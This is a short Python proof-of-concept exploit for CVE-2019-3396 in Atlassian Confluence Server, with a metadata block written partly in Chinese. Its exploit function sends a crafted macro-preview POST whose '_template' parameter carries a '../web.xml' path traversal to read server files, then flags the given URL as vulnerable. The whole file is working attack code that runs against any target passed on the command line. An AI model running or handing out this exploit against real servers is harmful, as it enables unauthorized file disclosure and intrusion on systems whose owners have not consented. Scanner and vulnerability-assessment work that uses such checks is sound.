#-*- coding:utf-8 -*-
import sys
import json
import requests

def poc_info():
    poc_info = {
        "id":"",
        "kind":"web",
        "type":"web",
        "name":"CVE-2019-3396",
        "status":"high",
        "description":"",
        "expansion":"",
        "resolution":"",
        "method":"POST",
        "payload":"",
        "header":"",
        "body":"",
        "affectedComponent":[{
            "name":"Confluence　Server",
            "description":"Atlassian 公司的 Confluence Server 是一个专业的企业知识管理与协同软件，可以用于构建企业wiki。通过它可以实现团队成员之间的协作和知识共享"
        }]
    }

    print(json.dumps(poc_info))

def exploit(uri):
    target = str(uri)+"/rest/tinymce/1/macro/preview"
    filename = "../web.xml"

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Referer": str(uri) + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"
    }
    data = '{"contentId":"1234","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
    try:
        result = requests.post(target,data=data,headers=headers)
        #print(result.text)
        if result.status_code == 200 and result.text is not None:
            print("{0} is vulnerable:CVE-2019-3396".format(target))
    except Exception:
        pass


if __name__ == "__main__":
    args = sys.argv[1]
    if args == 'poc_info':
        poc_info()
    else:
        exploit(args)